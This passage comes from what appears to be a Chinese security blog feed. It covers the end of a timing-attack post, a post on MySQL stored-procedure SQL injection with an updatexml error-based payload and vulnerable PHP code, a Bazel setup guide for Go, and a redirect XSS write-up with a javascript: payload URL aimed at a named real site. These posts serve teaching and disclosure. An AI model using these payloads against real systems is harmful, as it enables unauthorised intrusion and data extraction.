</span></span><span class="line"><span class="cl">if len(str1) != len(str2){
</span></span><span class="line"><span class="cl">   return false
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">for x, y in zip(str1, str2){
</span></span><span class="line"><span class="cl">   if x != y {
</span></span><span class="line"><span class="cl">     return flase
</span></span><span class="line"><span class="cl">   }
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">return true
</span></span></code></pre></td></tr></table>
</div>
</div><p>首先比较长度 不相同直接返回. 然后再比较各个字符.很显然如果长度不一样 将不会执行下面的代码 花的时间将会短一些. 可以通过比较时间来判断字符串的长度.</p>
<p>以现在的cpu速度 一个比较的时间几乎可以忽略不计. 也存在速度上的波动,但是只要尝试足够多的次数并平均(平均值总将趋向期望值) 总将可以猜测出它的长度和内容.</p>
<h3 id="分支攻击">分支攻击</h3>
<p>如果不使用php默认的字符串比较呢.时间攻击几乎不可避免的.
执行不同的代码可能导致执行时间不一致的分支几乎在所有代码中存在, 只要你使用了分支 执行的代码时间不一致 就可以进行猜测.
例如预先判断用户存在再判断密码的两条分支就可能进行用户枚举</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 一些查询用户是否存在的操作
</span></span><span class="line"><span class="cl">if (user){
</span></span><span class="line"><span class="cl">    // 登录操作
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">else {
</span></span><span class="line"><span class="cl">return
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="缓存">缓存</h3>
<p>上面的差异时间都比较小 而缓存造成的时间差异是非常显著的. 在开发时必须考虑缓存是否会导致时间攻击.这在web上问题比较少见,但是在硬件层面比较多.
例如cpu的Meltdown漏洞 就利用缓存的侧信道攻击</p>
<h3 id="防御">防御</h3>
<p>时间攻击的本质就是输入数据导致代码执行时间不一致.处于安全绝对 我们只需要将代码的时间差异减少到一个足够的量级就行.
对于字符串比较 在php可以通过一个函数解决 hash_equals 它使用相同的时间比较.
对于分支攻击 只能在开发上注意了.</p>
<p>###　参考
<a href="https://blog.ircmaxell.com/2014/11/its-all-about-time.html">https://blog.ircmaxell.com/2014/11/its-all-about-time.html</a>
<a href="https://eprint.iacr.org/2011/232.pdf">https://eprint.iacr.org/2011/232.pdf</a></p>
]]></content></item><item><title>Mysql 储存过程注入</title><link>https://blue-bird1.github.io/posts/mysql/</link><pubDate>Tue, 07 May 2019 02:42:17 +0800</pubDate><guid>https://blue-bird1.github.io/posts/mysql/</guid><description>Mysql 储存过程注入 mysql有着储存过程这个功能, 这次作者刚好遇到注入点在调用储存过程的sql注入. 基本知识 mysql可以通过以下语句创建一个储</description><content type="html"><![CDATA[<h3 id="mysql-储存过程注入">Mysql 储存过程注入</h3>
<p>mysql有着储存过程这个功能, 这次作者刚好遇到注入点在调用储存过程的sql注入.</p>
<h3 id="基本知识">基本知识</h3>
<p>mysql可以通过以下语句创建一个储存过程</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">CREATE</span><span class="w"> </span><span class="k">PROCEDURE</span><span class="w"> </span><span class="nf">sp_name</span><span class="p">(</span><span class="k">IN</span><span class="w"> </span><span class="n">param1</span><span class="w"> </span><span class="kt">INT</span><span class="p">,</span><span class="k">OUT</span><span class="w"> </span><span class="n">param2</span><span class="w"> </span><span class="kt">INT</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">BEGIN</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="c1"># code
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">END</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>sp_name是名字, 为IN的参数是入参,为OUT的参数为返回值</p>
<p>调用储存过程的语句</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="w"> </span><span class="k">CALL</span><span class="w"> </span><span class="nf">sp_name</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="注入分析">注入分析</h3>
<p>从语法我们可以分析出我们的输入可能出现在两处,和作为参数进入储存过程</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">CALL</span><span class="w"> </span><span class="o">&lt;</span><span class="err">储存过程名注入点</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&lt;</span><span class="err">储存过程参数注入点</span><span class="o">&gt;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>首先如果对参数过滤不严,无需进入储存过程就可以直接注入.用以下语句为例</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">CALL</span><span class="w"> </span><span class="nf">test</span><span class="p">([</span><span class="err">可控点</span><span class="p">])</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>由于是直接执行,所以我们可直接注入语句例如<code>(select 1)</code>.由于语法问题,这个括号是必须的,这语句就变成了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">CALL</span><span class="w"> </span><span class="nf">test</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">))</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这种注入和普通注入差别不大,已有技巧基本可以套用.</p>
<p>如果参数不可控,但是方法名可控也可以进行注入.但是首先要得知一个存在的储存过程名,然后通过注释后续语句来进行自己语句</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CALL [可控]()
</span></span></code></pre></td></tr></table>
</div>
</div><p>示例poc</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">test((select updatexml(1,concat(0x7e,(select @@version),0x7e),1))) -- 
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到和参数注入差距不大,只是用于参数不可控,或被安全处理的情况.</p>
<p>最后一种可能,在储存过程中出现.虽然储存过程被认为非常安全,但是实际上如果编写不慎 例如进行动态sql拼接 还是会出现注入的.. 例如</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 来自网上的一个例子 _field和_table是参数
</span></span><span class="line"><span class="cl">SET @strSql = CONCAT(&#39;SELECT &#39;,_field,&#39; FROM &#39;,_table);
</span></span><span class="line"><span class="cl">PREPARE stmt FROM @strSql;
</span></span><span class="line"><span class="cl">EXECUTE stmt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后附上我遇上的一个漏洞代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mode&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nv">$m</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span> <span class="s1">&#39;123456&#39;</span><span class="p">,</span> <span class="s1">&#39;UseStudio_Develop&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/*省略错误处理*/</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ary</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mode&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">     <span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$ary</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">&#39;CALL &#39;</span> <span class="o">.</span> <span class="nv">$m</span><span class="o">-&gt;</span><span class="na">real_escape_string</span><span class="p">(</span><span class="nv">$ary</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;()&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">&#39;CALL &#39;</span> <span class="o">.</span> <span class="nv">$m</span><span class="o">-&gt;</span><span class="na">real_escape_string</span><span class="p">(</span><span class="nv">$ary</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&#34;(&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$ary</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$sql</span><span class="o">.=</span> <span class="nv">$m</span><span class="o">-&gt;</span><span class="na">real_escape_string</span><span class="p">(</span><span class="nv">$ary</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$ary</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$sql</span><span class="o">.=</span> <span class="s2">&#34;&#39;,&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span><span class="o">.=</span> <span class="s2">&#34;&#39;)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">//执行查询，获取结果集
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$m</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 省略返回的代码
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>在golang项目开始使用Bazel</title><link>https://blue-bird1.github.io/posts/go-bazel/</link><pubDate>Sat, 27 Apr 2019 19:32:12 +0800</pubDate><guid>https://blue-bird1.github.io/posts/go-bazel/</guid><description>在golang项目开始使用Bazel Bazel是一个由java编写的编译工具,支持多语言编译,扩展,远程缓存等大量功能. 下载 推荐通过http</description><content type="html"><![CDATA[<h1 id="在golang项目开始使用bazel">在golang项目开始使用Bazel</h1>
<p><code>Bazel</code>是一个由java编写的编译工具,支持多语言编译,扩展,远程缓存等大量功能.</p>
<h2 id="下载">下载</h2>
<p>推荐通过<code>https://github.com/bazelbuild/bazel/releases</code>下载,</p>
<p><code>wget https://github.com/bazelbuild/bazel/releases/download/0.24.1/bazel-0.24.1-installer-linux-x86_64.sh</code></p>
<p>由于大家都知道的原因,下载速度很慢.建议在国外服务器下载</p>
<h2 id="快速开始">快速开始</h2>
<p><code>Bazel</code>使用两个特殊文件名 <code>WORKSPACE</code> 和<code>BUILD</code>定义项目.</p>
<p><code>WORKSPACE</code>定义一个项目工作区,例如外部依赖和工具链,<code>BUILD</code>定义如何编译这个项目.允许用多个<code>BUILD</code>定义不同部分的编译操作.</p>
<p>在项目创建一个<code>WORKSPACE</code>文件.然后需要载入Bazel的golang扩展 .以下均为官方基础例子</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 载入http_archive函数</span>
</span></span><span class="line"><span class="cl"><span class="n">load</span><span class="p">(</span><span class="s2">&#34;@bazel_tools//tools/build_defs/repo:http.bzl&#34;</span><span class="p">,</span> <span class="s2">&#34;http_archive&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 从github下载扩展</span>
</span></span><span class="line"><span class="cl"><span class="n">http_archive</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="s2">&#34;io_bazel_rules_go&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">urls</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;https://github.com/bazelbuild/rules_go/releases/download/0.18.3/rules_go-0.18.3.tar.gz&#34;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="n">sha256</span> <span class="o">=</span> <span class="s2">&#34;86ae934bd4c43b99893fc64be9d9fc684b81461581df7ea8fc291c816f5ee8c5&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 从下载的扩展里载入 go_rules_dependencies go_register_toolchains 函数</span>
</span></span><span class="line"><span class="cl"><span class="n">load</span><span class="p">(</span><span class="s2">&#34;@io_bazel_rules_go//go:deps.bzl&#34;</span><span class="p">,</span> <span class="s2">&#34;go_rules_dependencies&#34;</span><span class="p">,</span> <span class="s2">&#34;go_register_toolchains&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 注册一堆常用依赖 如github.com/google/protobuf golang.org/x/net</span>
</span></span><span class="line"><span class="cl"><span class="n">go_rules_dependencies</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 下载golang工具链</span>
</span></span><span class="line"><span class="cl"><span class="n">go_register_toolchains</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>一般来说都会使用gazelle工具来自动生成<code>BUILD</code>文件,而不是手写.添加以下加入<code>WORKSPACE</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 下载 gazelle</span>
</span></span><span class="line"><span class="cl">http_archive<span class="o">(</span>
</span></span><span class="line"><span class="cl">    <span class="nv">name</span> <span class="o">=</span> <span class="s2">&#34;bazel_gazelle&#34;</span>,
</span></span><span class="line"><span class="cl">    <span class="nv">urls</span> <span class="o">=</span> <span class="o">[</span><span class="s2">&#34;https://github.com/bazelbuild/bazel-gazelle/releases/download/0.17.0/bazel-gazelle-0.17.0.tar.gz&#34;</span><span class="o">]</span>,
</span></span><span class="line"><span class="cl">    <span class="nv">sha256</span> <span class="o">=</span> <span class="s2">&#34;3c681998538231a2d24d0c07ed5a7658cb72bfb5fd4bf9911157c0e9ac6a2687&#34;</span>,
</span></span><span class="line"><span class="cl"><span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 载入依赖</span>
</span></span><span class="line"><span class="cl">load<span class="o">(</span><span class="s2">&#34;@bazel_gazelle//:deps.bzl&#34;</span>, <span class="s2">&#34;gazelle_dependencies&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">gazelle_dependencies<span class="o">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在<code>BUILD</code>文件写入</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">load<span class="o">(</span><span class="s2">&#34;@bazel_gazelle//:def.bzl&#34;</span>, <span class="s2">&#34;gazelle&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 下面这行是必要的注释 注明了你的包前缀 例如github.com/example/project</span>
</span></span><span class="line"><span class="cl"><span class="c1"># gazelle:prefix go-common</span>
</span></span><span class="line"><span class="cl">gazelle<span class="o">(</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&#34;go-common&#34;</span><span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后运行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 如果上面修改了名字 这里也需要修改</span>
</span></span><span class="line"><span class="cl">bazel run  //:gazelle
</span></span></code></pre></td></tr></table>
</div>
</div><p>成功输出如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">INFO: 0 processes.
</span></span><span class="line"><span class="cl">INFO: Build completed successfully, 1 total action
</span></span><span class="line"><span class="cl">INFO: Build completed successfully, 1 total action
</span></span></code></pre></td></tr></table>
</div>
</div><p>进行编译</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bazel build //...
</span></span></code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>XSS实战 跳转XSS</title><link>https://blue-bird1.github.io/posts/location-xss/</link><pubDate>Sat, 20 Apr 2019 12:43:40 +0800</pubDate><guid>https://blue-bird1.github.io/posts/location-xss/</guid><description>XSS实战: 跳转XSS 前言 跳转XSS实际上并不是一种新类型的攻击方式, 主要形成原因是 以前网站外部跳转时是直接接受参数然后跳转,导致了URL重</description><content type="html"><![CDATA[<h2 id="xss实战-跳转xss">XSS实战: 跳转XSS</h2>
<h3 id="前言">前言</h3>
<p>跳转XSS实际上并不是一种新类型的攻击方式,</p>
<p>主要形成原因是 以前网站外部跳转时是直接接受参数然后跳转,导致了URL重定向漏洞.而现在网站喜欢加个跳转页,不会直接跳转,而是接受参数然后用js跳转. 这就有一个问题 如果未验证参数, js跳转时是可以接受JavaScript伪协议执行js代码的.</p>
<h3 id="漏洞代码示例">漏洞代码示例</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">	echo &#34;&lt;script&gt;window.location.href = $_GET[&#39;url&#39;]&lt;/script&gt;&#34;;
</span></span><span class="line"><span class="cl">?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="实战例子">实战例子</h3>
<p>以拉勾网为例,作者打开页面都会先看看js里有什么信息.很快发现js里有这段代码</p>
<p><img src="https://i.loli.net/2019/04/20/5cbb2a45d44a9.png" alt="Screenshot_15.png"></p>
<p>显然只有有参数的才能引起兴趣.作者快速尝试了<code>https://sec.lagou.com/verify.html?e=test1&amp;f=test2</code></p>
<p>发现url参数直接进入了页面,当然与本次主题有关的是参数<code>f</code>.虽然另一个更直接. 它在页面的位置是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    function submit1(data){
</span></span><span class="line"><span class="cl">        var host = &#34;test2&#34;;
</span></span><span class="line"><span class="cl">        $.ajax({
</span></span><span class="line"><span class="cl">            url: &#39;parseSession&#39;,
</span></span><span class="line"><span class="cl">            type: &#34;post&#34;,
</span></span><span class="line"><span class="cl">            dataType: &#34;json&#34;,
</span></span><span class="line"><span class="cl">            data: {
</span></span><span class="line"><span class="cl">                challenge: data.challenge,
</span></span><span class="line"><span class="cl">                errcode:1
</span></span><span class="line"><span class="cl">            },
</span></span><span class="line"><span class="cl">            success: function (result) {
</span></span><span class="line"><span class="cl">                window.location.href = host;
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        })
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        //$.getJSON(&#39;/user/sendCode.json&#39;, {t: new Date().getTime(), type: $(&#39;#contactSelect&#39;).val()}, function (data)
</span></span><span class="line"><span class="cl">    }
</span></span></code></pre></td></tr></table>
</div>
</div><p>尝试引入双引号.被转义了.所以这个参数就没问题了么?并不是.下面的代码使用了这个参数进行跳转.</p>
<p>可以使用<code>https://sec.lagou.com/verify.html?e=1&amp;f=JavaScript:alert(1)</code>弹框.</p>
<h3 id="最后">最后</h3>
<p>首先拉勾网是没有src的,别想了. 另外现在这个问题似乎已经修复了?访问 <a href="https://sec.lagou.com/parseSession">https://sec.lagou.com/parseSession</a>会302..</p>
<p>e参数没修.e出现的代码为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#submit&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;code&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">showError</span><span class="p">(</span><span class="s1">&#39;请填写验证码&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;111111&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">test1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">                <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;checkcode&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">type</span><span class="o">:</span> <span class="s2">&#34;post&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">dataType</span><span class="o">:</span> <span class="s2">&#34;json&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">t</span><span class="o">:</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">code</span><span class="o">:</span> <span class="nx">code</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">errcode</span> <span class="o">:</span><span class="nx">test1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">},</span>
</span></span><span class="line"><span class="cl">                <span class="nx">success</span><span class="o">:</span><span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
